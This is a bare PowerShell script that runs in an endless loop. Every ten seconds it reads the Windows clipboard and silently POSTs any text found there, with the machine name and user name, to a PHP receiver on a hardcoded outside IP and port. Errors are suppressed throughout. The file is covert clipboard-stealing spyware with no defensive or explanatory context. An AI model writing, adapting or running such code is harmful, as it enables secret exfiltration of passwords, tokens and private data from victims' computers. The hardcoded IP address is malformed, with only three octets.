Add-Type -AssemblyName System.Windows.Forms

$ip = "128.12.12"
$port = "1111"
$url = "http://${ip}:${port}/clipboard-reciver.php"

while ($true) {
    try {
        $clipText = [System.Windows.Forms.Clipboard]::GetText()
        if ($clipText -and $clipText.Trim()) {
            $body = @{
                clipboard_data = $clipText
                machine_name = $env:COMPUTERNAME
                user_name = $env:USERNAME
            }
            Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue
        }
    } catch { }
    Start-Sleep -Seconds 10
}